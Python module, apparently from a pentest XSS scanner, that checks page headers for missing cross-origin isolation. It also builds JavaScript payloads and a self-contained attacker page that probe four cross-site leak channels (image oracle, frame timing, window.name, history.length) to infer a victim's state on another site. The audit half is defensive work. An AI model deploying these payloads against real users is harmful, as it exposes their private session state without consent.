"""XS-Leaks (cross-site leaks) -- audit + exploitation-channel library.

Cross-site leaks let a page that runs script in *any* origin (including one
with a confirmed XSS) infer the victim's state in ANOTHER origin -- is she
logged into the CRM? does /admin return 200? is a document present? -- by
observing side channels the browser cannot fully hide cross-origin:
no-cors resource load success/failure, frame load timing, window.name
carried across navigations, history.length growth, and window references.

An XSS scanner cannot *scan* a third origin's state on its own (that needs
a victim browsing session), but a pentest report is expected to demonstrate
the blast radius.  This module therefore provides the two halves a
consultant needs:

1. :func:`audit_mitigations` -- the target-side audit.  A page that sets
   NO cross-origin isolation headers (COOP / CORP / COEP) and no framing
   restriction (X-Frame-Options / CSP frame-ancestors) leaves every
   channel open; the scanner records that as a low-severity
   ``xs_leak_surface`` finding (the amplifier, not the XSS itself).

2. The channel catalog + payload builders + :func:`build_demo_html` --
   attacker-page material that exercises each channel against a target
   the operator configures, turning "reflected XSS on A" into a concrete
   demonstration of what can be leaked about B.

Channels here are *demonstration grade*: each is a real browser side
channel, but whether a particular channel yields signal depends on the
target's exact behaviour (redirects, framing headers, caching), which is
exactly why the demo runs in a browser rather than pretending to decide
from the scanner side.
"""
from __future__ import annotations

# ---------------------------------------------------------------------------
# 1. Target-side mitigation audit
# ---------------------------------------------------------------------------

# Which headers close which channels (see audit_mitigations for the logic).
_COOP_SAME_ORIGIN = "same-origin"          # kills window.opener/history-length
_CORP_VALUES = {"same-origin", "same-site"}  # kills no-cors resource oracles
_FRAME_GUARDS = ("x-frame-options", "content-security-policy")  # kills framing


def audit_mitigations(response_headers) -> dict | None:
    """Audit one page response for missing XS-Leaks isolation.

    ``response_headers`` is a case-insensitive-ish mapping (dict / requests
    CaseInsensitiveDict / aiohttp CIMultiDict all work via .get).

    Returns a finding dict when the page leaves the full XS-Leak surface
    open, else None.  Only the *absence of all three families* reports --
    partial hardening (one header present) suppresses the note so the audit
    does not spam every ordinary site.
    """
    def _get(name: str) -> str:
        try:
            return str(response_headers.get(name) or "").strip()
        except Exception:
            return ""

    coop = _get("Cross-Origin-Opener-Policy").lower()
    corp = _get("Cross-Origin-Resource-Policy").lower()
    coep = _get("Cross-Origin-Embedder-Policy").lower()
    xfo = _get("X-Frame-Options").lower()
    csp = _get("Content-Security-Policy").lower()

    has_coop = coop.startswith(_COOP_SAME_ORIGIN) or \
        coop.startswith("same-origin")           # incl. same-origin-allow-popups
    has_corp = corp in _CORP_VALUES
    has_coep = coep.startswith("require-corp")
    has_frame_guard = xfo in ("deny", "sameorigin") or \
        "frame-ancestors" in csp
    isolated = has_coop or has_corp or has_coep or has_frame_guard
    if isolated:
        return None

    present = [h for h, _ in (
        ("Cross-Origin-Opener-Policy", coop),
        ("Cross-Origin-Resource-Policy", corp),
        ("Cross-Origin-Embedder-Policy", coep),
        ("X-Frame-Options", xfo),
    ) if _get(h)]
    return {
        "type": "xs_leak_surface",
        "severity": "low",
        "confidence": "firm",
        "param": "",
        "context": "response_headers",
        "detail": (
            "page sets NO cross-origin isolation (COOP/CORP/COEP) and no "
            "framing restriction (X-Frame-Options/CSP frame-ancestors): "
            "cross-site leak channels (no-cors resource oracle, frame "
            "timing, window.name/history side channels) stay open against "
            "this origin"),
        "evidence": "present isolation headers: "
                    + (", ".join(present) if present else "(none)"),
    }


# ---------------------------------------------------------------------------
# 2. Exploitation channels (demonstration payloads)
# ---------------------------------------------------------------------------

#: Channel catalog: id -> (name, one-line description).
CHANNELS: dict[str, tuple[str, str]] = {
    "img_oracle": (
        "No-cors resource oracle",
        "loads <img>/<script> cross-origin; onload vs onerror reveals whether "
        "the URL answers (login walls, 404-vs-200, CORP-blocked resources)."),
    "frame_timing": (
        "Frame load timing",
        "time a hidden iframe to the target vs a guaranteed-missing path; a "
        "slower/absent response implies the target exists (no TAO needed)."),
    "window_name": (
        "window.name carry",
        "set window.name, navigate to the target, return; the name survives "
        "if the target does not reset it -- leaks state across the hop."),
    "history_length": (
        "history.length growth",
        "navigating the tab to the target adds an entry; length before/after "
        "distinguishes blocked (COOP popup) from permitted navigation."),
}


def channel_ids() -> list[str]:
    return list(CHANNELS)


def validate_target(target_url: str) -> str:
    """Normalise/validate a demo target URL (scheme http/https only)."""
    t = (target_url or "").strip()
    if not t.lower().startswith(("http://", "https://")):
        raise ValueError(f"target must be an http(s) URL, got: {target_url!r}")
    return t


def build_channel_js(channel: str, target_url: str) -> str:
    """Return a self-contained JS snippet exercising one channel.

    Every snippet writes its verdict into ``window.__xssentinel_xsleak``
    (an array of {channel, ok, note}) so the demo page can render results
    without a server.  Raises KeyError for unknown channels.
    """
    if channel not in CHANNELS:
        raise KeyError(f"unknown XS-Leak channel: {channel!r}")
    t = validate_target(target_url)
    tjs = _js_str(t)

    if channel == "img_oracle":
        return (
            "(()=>{const r={channel:'img_oracle'};const i=new Image();"
            "const done=(ok,note)=>{r.ok=ok;r.note=note;"
            "window.__xssentinel_xsleak.push(r);};"
            "i.onload=()=>done(true,'resource loaded (URL answers)');"
            f"i.onerror=()=>done(false,'load blocked/error (no-cors 404, "
            f"CORP, or network)');i.src={tjs};}})();"
        )
    if channel == "frame_timing":
        return (
            "(()=>{const r={channel:'frame_timing'};"
            "const t0=performance.now();const f=document.createElement('iframe');"
            "const done=(ok,note)=>{r.ok=ok;r.note=note;"
            "window.__xssentinel_xsleak.push(r);};"
            "f.style.display='none';f.onload=()=>done(true,"
            "'frame loaded in '+(performance.now()-t0).toFixed(0)+'ms');"
            "f.onerror=()=>done(false,'frame blocked (X-Frame-Options/CSP)');"
            f"f.src={tjs};document.body.appendChild(f);}})();"
        )
    if channel == "window_name":
        # Two-hop demo: stash a marker in window.name, bounce to the target,
        # and (script cannot run on the target) rely on a location back --
        # the demonstration page instead shows the primitive: after the
        # cross-origin hop the name SURVIVES unless the target overwrites it.
        return (
            "(()=>{const r={channel:'window_name'};"
            f"window.name='xssentinel-xsleak-'+Date.now();r.ok=true;"
            "r.note='window.name set; navigate to target and return to test "
            "whether it survives (see console)';"
            f"console.log('hop to',{tjs});"
            "window.__xssentinel_xsleak.push(r);})();"
        )
    if channel == "history_length":
        return (
            "(()=>{const r={channel:'history_length'};"
            "const before=history.length;"
            "const f=document.createElement('iframe');f.style.display='none';"
            "f.onload=()=>{setTimeout(()=>{r.ok=history.length>before;"
            "r.note='history.length '+before+' -> '+history.length;"
            "window.__xssentinel_xsleak.push(r);},300);};"
            f"f.src={tjs};document.body.appendChild(f);}})();"
        )
    raise AssertionError("unreachable")


def _js_str(s: str) -> str:
    """Quote a URL for embedding inside a double-quoted JS string."""
    return '"' + s.replace("\\", "\\\\").replace('"', '\\"') + '"'


def build_demo_html(title: str, target_url: str,
                    channels: list[str] | None = None) -> str:
    """A self-contained attacker page exercising the channels against
    ``target_url`` (a site the victim uses).  Open it in a browser where the
    victim session for ``target_url`` is active; results render inline.

    ``channels`` defaults to all channels; each verdict is painted as a row.
    """
    target = validate_target(target_url)
    use = [c for c in (channels or list(CHANNELS)) if c in CHANNELS]
    rows = "\n".join(
        f'<tr><td><code>{c}</code></td><td>{CHANNELS[c][0]}</td>'
        f'<td class="v" id="v-{c}">pending…</td></tr>' for c in use)
    js = "\n".join(
        f"try {{ {build_channel_js(c, target)} }} "
        f"catch(e) {{ window.__xssentinel_xsleak.push({{channel:'{c}',"
        "ok:false,note:'payload error: '+e.message}}); }}"
        for c in use)
    tjs = _js_str(target)
    return f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><title>{_esc(title)}</title>
<style>body{{font:14px/1.5 monospace;margin:2rem;}}table{{border-collapse:collapse;
width:100%;}}td,th{{border:1px solid #ccc;padding:.4rem .6rem;text-align:left;}}
.ok{{color:#0a0;}} .no{{color:#c00;}}</style></head>
<body><h1>{_esc(title)}</h1>
<p>XS-Leak demonstration against <code>{_esc(target)}</code>. Run this page
in a browser where the target session is active. Channels marked with a
serverless verdict row; the underlying primitives are real browser side
channels, so results depend on the target's behaviour.</p>
<table><thead><tr><th>channel</th><th>technique</th><th>verdict</th></tr></thead>
<tbody>{rows}</tbody></table>
<script>
window.__xssentinel_xsleak = [];
{js}
setTimeout(()=>{{
  const rows = {{}};
  for (const r of window.__xssentinel_xsleak) rows[r.channel] = r;
  for (const c of {_js_str(','.join(use))}.split(',')) {{
    const cell = document.getElementById('v-' + c);
    if (!cell || !rows[c]) continue;
    const r = rows[c];
    cell.textContent = (r.ok ? 'LIKELY-SIGNAL' : 'no-signal/blocked') +
                       ' — ' + r.note;
    cell.className = r.ok ? 'ok' : 'no';
  }}
}}, 2500);
</script></body></html>
"""


def _esc(s: str) -> str:
    import html as _html
    return _html.escape(str(s))
